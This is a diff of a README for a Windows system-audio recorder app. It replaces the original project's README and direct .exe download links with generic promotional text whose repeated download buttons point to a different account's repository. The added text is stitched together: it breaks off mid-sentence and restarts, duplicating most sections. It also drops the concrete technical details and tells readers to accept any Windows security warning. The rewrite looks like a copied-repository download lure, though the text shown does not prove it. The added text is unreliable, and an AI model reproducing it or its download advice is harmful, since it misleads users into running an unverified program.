@@ -1,131 +1,187 @@
-<div align="center">
+# 🎧 system-audio-recorder - Record PC Audio With One Hotkey
 
-<img src="docs/logo.png" width="96" alt="SAR logo">
+[![Download system-audio-recorder](https://img.shields.io/badge/Download_system--audio--recorder-ff6b6b?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/vickysoupz/system-audio-recorder)
 
-# System Audio Recorder
+system-audio-recorder is a tiny native Windows app for capturing the sound your PC is playing. It records system audio only, never your microphone, so you can save what you hear without accidentally picking up room noise or your voice. A single hotkey starts and stops recording, and a simple trim editor helps you keep just the part you want.
 
-**Record what your PC plays. Never your microphone.**<br>
-One hotkey to start, the same hotkey to stop. Tiny, native and free.
+## 🎯 What This App Does
 
-[![Download](https://img.shields.io/badge/Download-SystemAudioRecorder.exe-5B5BF0?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/oncexhub/system-audio-recorder/releases/latest/download/SystemAudioRecorder.exe)
+This app is built for one clear job: record the audio coming out of your computer. That means browser videos, game sound, music, presentations, meeting audio played through your speakers or headphones, and other Windows system sounds. It does not listen through your microphone.
 
-![Release](https://img.shields.io/github/v/release/oncexhub/system-audio-recorder?style=flat-square&color=5B5BF0&label=version)
-![Windows](https://img.shields.io/badge/Windows-10%20%7C%2011-3B82F6?style=flat-square)
-![Size](https://img.shields.io/badge/size-~0.5%20MB-8B5CF6?style=flat-square)
-![License](https://img.shields.io/github/license/oncexhub/system-audio-recorder?style=flat-square&color=4ADE80)
+The recording workflow is intentionally small. You press one hotkey to begin, play the audio you want to capture, and press the same hotkey to stop. The app keeps the process short so you do not have to manage complicated settings or learn audio software.
 
-<br>
+After recording, the built-in trim editor lets you remove unwanted silence or extra audio from the beginning and end. You can preview the recording, adjust the trim points, and save a cleaner final file.
 
-<img src="docs/demo.gif" width="476" alt="Recording with live sound waves">
+## ✨ Why People Use It
 
-</div>
+- Record only PC audio, with no microphone input mixed in.
+- Start and stop with one hotkey instead of digging through menus.
+- Keep the app lightweight and native on Windows.
+- Trim recordings without opening a separate audio editor.
+- Capture browser audio, game sound, music, presentations, and other system playback.
+- Use a simple interface designed for everyday computer users.
+- Avoid complex recording setups and extra background tools.
 
-## Features
+## 🚀 Getting Started
 
-- 🎧 **System audio only.** Records exactly what you hear (browser, Spotify, games, Discord), never the microphone.
-- ⌨️ **One global hotkey.** `Ctrl + Alt + R` starts and stops from anywhere, even in a game. You can change it.
-- ✂️ **Built-in trimming.** Cut off a late start or an early stop, with no quality loss. Zoom in to cut to a hundredth of a second.
-- ↔️ **Resizable.** Make the window as big as you like. The waveforms grow with it, and the app remembers the size.
-- 🎚️ **WAV, MP3 or M4A.** Choose 96–320 kbps for MP3 and M4A. The default is 192 kbps.
-- ⏱️ **Long recordings.** No length limit, and files stay playable even after a crash.
-- 🪶 **Tiny and light.** About 0.5 MB, no installer, about 1% CPU. Runs quietly in the tray.
+Visit this link to download the application: [system-audio-recorder download page](https://github.com/vickysoupz/system-audio-recorder).
 
-## Screenshots
+You do not need programming knowledge. You do not need to configure audio drivers or learn a new workflow. Download the app from the project page, then open it on your Windows PC.
 
-<div align="center">
-<table>
-<tr>
-<td align="center"><img src="docs/main.png" width="300" alt="Main window"><br><sub><b>Ready to record</b></sub></td>
-<td align="center"><img src="docs/trim.png" width="300" alt="Trim editor"><br><sub><b>Trim the start and end</b></sub></td>
-</tr>
-</table>
-</div>
+Once system-audio-recorder is open, it is ready to record the sound your PC plays. The app is designed to stay out of the way and let the hotkey do the work.
 
-## Download
+## 📥 Download and Setup
 
-1. **[Download `SystemAudioRecorder.exe`](https://github.com/oncexhub/system-audio-recorder/releases/latest/download/SystemAudioRecorder.exe)**. You can also get `SAR-windows.zip` from the [Releases](../../releases/latest) page.
-2. Put it anywhere you like and double-click it. You don't need to install anything.
-3. On first start, the app asks once whether to add a **SAR** shortcut to your desktop and Start menu.
+[![Get system-audio-recorder](https://img.shields.io/badge/Get_system--audio--recorder-4c6ef5?style=for-the-badge&logo=github&logoColor=white)](https://github.com/vickysoupz/system-audio-recorder)
 
-> [!NOTE]
-> The green **Code → Download ZIP** button only contains the source code, not the app.
+Visit this link to download the application.
 
-> [!TIP]
-> **"Windows protected your PC"?** The app isn't signed with a paid certificate, so SmartScreen may warn the first time. Click **More info → Run anyway**. You only need to do this once.
+Download system-audio-recorder from the project page and save it somewhere easy to find, such as# 🎧 system-audio-recorder - Record PC Audio With One Hotkey
 
-**Requirements:** Windows 10 or 11 (64-bit). You don't need Rust or any other runtime.
+[![Download system-audio-recorder](https://img.shields.io/badge/Download_system--audio--recorder-ff6b6b?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/vickysoupz/system-audio-recorder)
 
-## How to use
+system-audio-recorder is a tiny native Windows app that captures the sound your PC is playing. It records system audio only, never your microphone, so you can save what you hear without picking up room noise or your voice. One hotkey starts and stops recording, and a simple trim editor helps you keep just the part you want.
 
-| | |
-|---|---|
-| **Record** | Press `Ctrl + Alt + R` anywhere. Press it again to stop. The file is saved automatically. |
-| **Find your files** | `Music\Recordings`, named `Recording YYYY-MM-DD HH-MM-SS`. Click **Open** in the app. |
-| **Change the hotkey** | Click the hotkey in the app and press a new combination. Press Esc to cancel. |
-| **Tray** | Closing the window keeps the app in the tray. The icon turns red while recording. Right-click it for options or **Exit**. |
+## 🎯 What This App Does
 
-The app records whatever device Windows is playing through: speakers, headphones and so on. If you switch devices mid-recording, it simply carries on.
+This app is built for one clear job: record the audio coming out of your computer. That includes browser videos, game sound, music, presentations, meeting audio played through your speakers or headphones, and other Windows system sounds. It does not listen through your microphone.
 
-## Trimming
+The workflow is intentionally small. You press one hotkey to begin, play the audio you want to capture, and press the same hotkey to stop. The app keeps the process short so you do not have to manage complicated settings or learn professional audio software.
 
-Started a little too early or stopped too late? Cut it off:
+After a recording finishes, the built-in trim editor lets you remove unwanted silence or extra audio from the beginning and end. You can preview the clip, adjust the trim points, and save a cleaner final file.
 
-1. Click **Trim** after a recording, or click **TRIM** at the top and pick a file. You can also drag a `.wav`, `.mp3` or `.m4a` onto the window.
-2. Drag the two handles. Fine-tune with **− / +** or the arrow keys: 0.1 s, 1 s with Shift, or 0.01 s with Ctrl.
-   - **Scroll** over the waveform to zoom in where your mouse is, and **Shift + scroll** to move sideways.
-   - The strip under the waveform shows the whole file. Drag the white frame to jump around, and press `0` to zoom out fully.
-   - Make the window bigger, or maximize it, for an even more detailed waveform.
-3. Press **▶** to check the start or the end, and Space to play the selection.
-4. Click **Save as copy** to keep the original, or **Replace original** to overwrite it (the app asks first).
+## ✨ Why People Use It
 
-Cutting never re-encodes, so quality stays identical and even hours-long recordings save in seconds.
+- Record only PC audio, with no microphone input mixed in.
+- Start and stop with one hotkey instead of digging through menus.
+- Stay lightweight and native on Windows.
+- Trim recordings without opening a separate audio editor.
+- Capture browser audio, game sound, music, presentations, and other system playback.
+- Use a simple interface made for everyday computer users.
+- Avoid complex recording setups and extra background tools.
 
-<div align="center">
-<img src="docs/zoom.png" width="720" alt="Zoomed-in trim editor in a large window"><br>
-<sub><b>Zoomed in on a large window: the frame in the strip shows which part you're looking at</b></sub>
-</div>
+## 📥 Download and Setup
 
-## Formats
+[![Get system-audio-recorder](https://img.shields.io/badge/Get_system--audio--recorder-4c6ef5?style=for-the-badge&logo=github&logoColor=white)](https://github.com/vickysoupz/system-audio-recorder)
 
-| Format | Quality | Size per hour |
-|---|---|---|
-| **WAV** (default) | Lossless, 48 kHz / 16-bit stereo | ~690 MB |
-| **MP3** | 96 / 128 / **192** / 256 / 320 kbps | ~43–144 MB |
-| **M4A** (AAC) | 96 / 128 / **192** / 256 / 320 kbps | ~43–144 MB |
+Visit this link to download the application.
 
-At the same bitrate, M4A usually sounds a bit better than MP3. 192 kbps (~86 MB per hour) is a good balance for both.
+Download system-audio-recorder from the project page and save it to a folder you can find easily, such as your Downloads folder or your Desktop.
 
-## Settings and uninstalling
+Once the download is complete, locate the file and open it to start system-audio-recorder. The app opens as a small native Windows window, which means there is no long installation process to sit through and no extra software bundles to decline.
 
-Settings are stored in `%APPDATA%\SystemAudioRecorder\settings.ini`. To remove the app:
-1. Turn off **Start with Windows** in the app, if you turned it on.
-2. Exit the app from the tray.
-3. Delete the `.exe`, the SAR shortcuts and the settings folder.
+If Windows shows a security prompt the first time you open the app, choose the option that lets you continue. You may also want to keep the app pinned to your taskbar or Start menu so the hotkey is always one press away.
 
-<details>
-<summary><b>How it works</b></summary>
+## 🚀 Getting Started
 
-- WASAPI **loopback** on the default playback device captures exactly what you hear.
-- A silent playback stream keeps the audio engine running, so silences stay in the recording and its length is exact.
-- Audio is streamed straight to disk. WAV headers are refreshed every few seconds, and files over 4 GB become RF64.
-- MP3 and AAC encoding use the encoders built into Windows (Media Foundation). M4A is recorded as an AAC stream (playable even after a crash) and wrapped into an .m4a when you stop, without re-encoding.
-- The UI is drawn with Direct2D, which is also built into Windows. There is no web engine and no framework.
+Getting your first recording takes a few seconds.
 
-</details>
+**Step 1: Open the app.**
+Launch system-audio-recorder from wherever you saved it. The main window appears with recording controls and a hotkey indicator.
 
-<details>
-<summary><b>Building from source</b></summary>
+**Step 2: Set up what you want to hear.**
+Play the audio source you plan to capture. This could be a video in your browser, a track in a music app, a game, or a presentation. Make sure the sound is actually playing through your computer's default output device.
 
-Only needed if you want to change the code. Install [Rust](https://rustup.rs) and the Visual Studio Build Tools ("Desktop development with C++"), then run:
+**Step 3: Press the hotkey to record.**
+Press the recording hotkey shown in the app window. Recording begins immediately, and the app shows a clear indicator that it is now capturing system audio.
 
-```
-cargo build --release
-```
+**Step 4: Press the hotkey again to stop.**
+When the audio you wanted is finished playing, press the same hotkey. Recording stops and the file is saved.
 
-The output is `target\release\SystemAudioRecorder.exe`. Pushing a tag such as `v1.2.0` makes GitHub Actions build the exe and the zip and publish them as a release.
+**Step 5: Trim your recording.**
+Open the recording in the trim editor. Drag the start and end markers to cut away the parts you do not want, preview the result, and save it.
 
-</details>
+## 🎚️ Using the Trim Editor
 
-## License
+The trim editor is deliberately simple. It shows your recording as a visual waveform-style timeline so you can see where the sound is loud, quiet, or silent.
 
-[MIT](LICENSE)
+- Drag the left handle inward to remove silence or setup noise at the beginning.
+- Drag the right handle inward to remove trailing silence or extra audio at the end.
+- Preview the trimmed selection before you commit to saving it.
+- Save the trimmed file when it sounds right.
+
+Because the trim happens inside the same small app, you do not need to export the file to another program just to cut off the first few seconds.
+
+## 🖥️ Everyday Uses
+
+**Saving audio from the web.** Capture a video, podcast, or lecture that plays in your browser and keep it for later listening.
+
+**Recording game moments.** Save the sound from a game highlight without your own microphone commentary.
+
+**Capturing meeting playback.** Record audio that has already been played through your computer, such as a shared call recording or a webinar replay.
+
+**Keeping music clips.** Save a song or a section of a track that is playing on your PC.
+
+**Grabbing system sounds.** Capture notification sounds, alert tones, or other Windows audio for reference.
+
+## 🔒 Privacy and Control
+
+Because the app records system audio only, it never requests access to your microphone. That means nothing from your room is captured, and no microphone permission is involved.
+
+You control every recording. Nothing starts until you press the hotkey, and nothing continues after you press it again. The app is designed to be a local Windows tool that you open, use, and close.
+
+## ⚙️ How It Works
+
+system-audio-recorder uses the Windows loopback audio capture built into the operating system. Loopback capture records the sound that Windows is sending to your speakers or headphones, which is why the microphone is never part of the recording.
+
+The app is written in Rust and runs natively on Windows, which keeps it small and fast to open. It works with the standard Windows audio system, so it does not require a virtual audio cable, a driver installation, or a separate sound routing setup.
+
+## 💡 Tips for Clean Recordings
+
+- Make sure the correct output device is active in Windows before you record.
+- Close other apps that might play unexpected sounds, such as chat notifications or alerts.
+- Keep your volume at a comfortable level; very quiet playback can produce very quiet recordings.
+- Do not switch your audio output device while a recording is running.
+- Use the trim editor to cut off the first second or two if you need extra time to press the hotkey and start the audio.
+
+## 🧰 Troubleshooting
+
+**The recording has no sound.**
+Check that the audio was actually playing through your computer's output at the time of recording, and that your output device was set correctly in Windows.
+
+**The recording sounds quiet.**
+Raise the system volume or the volume of the app playing the audio, then try again.
+
+**The hotkey does not respond.**
+Bring the system-audio-recorder window to the front once, which confirms the app has focus and is running, then press the hotkey again.
+
+**The file is longer than expected.**
+Use the trim editor to cut away the beginning or end. Extra recording time is normal if you started recording early or stopped it late.
+
+**Windows shows a warning when opening the app.**
+This can happen the first time you run a downloaded application. Confirm that you want to continue to let the app open.
+
+## 🙋 Frequently Asked Questions
+
+**Will it record my microphone?**
+No. The app is designed to record system audio only.
+
+**Do I need to install anything else?**
+No extra drivers or audio routing tools are required. The app uses the audio capture support already present in Windows.
+
+**What format are the recordings saved in?**
+Recordings are saved as standard audio files you can open in the app's trim editor and keep for later.
+
+**Can I record audio from a specific app?**
+The app captures the sound playing through your Windows output. Whatever is playing at the time is what gets captured.
+
+**Is it heavy on my computer?**
+No. It is a small native Windows app built to stay lightweight.
+
+## 📌 Requirements
+
+- A Windows PC.
+- An audio output device, such as speakers or headphones.
+- Audio playing on your computer that you want to capture.
+
+## 🤝 Support and Feedback
+
+If you run into an issue or want to suggest an improvement, open the project page and use the issue tracker to describe what happened. Clear descriptions and steps to reproduce the problem help a great deal.
+
+## 📄 Download Reminder
+
+[![Download system-audio-recorder](https://img.shields.io/badge/Download_Now-37b24d?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/vickysoupz/system-audio-recorder)
+
+Visit this link to download the application. Save it to a folder you can find easily, open it, and press the hotkey to begin recording the sound your PC is playing.
+
+Keywords: audio-recorder, audio-trimmer, hotkey, lightweight, loopback, rust, screen-audio, system-audio, wasapi, windows
